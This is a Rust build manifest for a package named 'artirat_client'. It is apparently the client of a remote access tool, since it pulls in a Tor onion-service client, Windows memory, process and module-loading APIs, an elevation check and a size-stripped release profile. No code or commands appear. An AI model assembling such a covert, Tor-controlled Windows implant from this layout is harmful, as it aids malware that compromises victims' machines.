[package]
name = "artirat_client"
version = "0.1.2"
edition = "2024"

[target.'cfg(windows)'.dependencies]
winapi = {version = "0.3.9", features=[
    "memoryapi",
    "libloaderapi",
    "winuser", 
    "processthreadsapi", 
    "psapi", 
    "handleapi", 
    "minwindef",
    "fileapi",
    "ioapiset",
    "memoryapi",
    "wow64apiset",
    "minwindef",
    "ntdef"
] }
windows = { version = "0.58", features = [
    "Win32_System_SystemServices",
    "Win32_System_WindowsProgramming"
] }
winres = "0"
win32-error = "0.9.0"


[dependencies]
arti-client = { version = "0.41", features = ["onion-service-client","rustls","static-sqlite"] }
gethostname = "0.4.3"
tor-rtcompat = { version = "0.41", features = ["tokio"] }
tokio = { version = "1", features = ["full"] }
anyhow = "1"
rand = { version = "0.8", features = ["std", "std_rng"] }
rusqlite = { version = "0", features = ["bundled"] }
zstd = { version = "0.13", features = ["zstdmt"] }
openssl = { version = "0", features = ["vendored"] }

uuid = { version = "1.2", features = ["v4"] }
is_elevated = "0.1"

[profile.release]
opt-level = "z"        # optimize for size ("s" is a bit faster, "z" is smallest)
debug = 0
lto = true             # link-time optimization
codegen-units = 1      # better optimization, smaller binary
strip = true           # remove symbols (since Rust 1.70+)
panic = "abort"        # removes unwinding code

[lib]
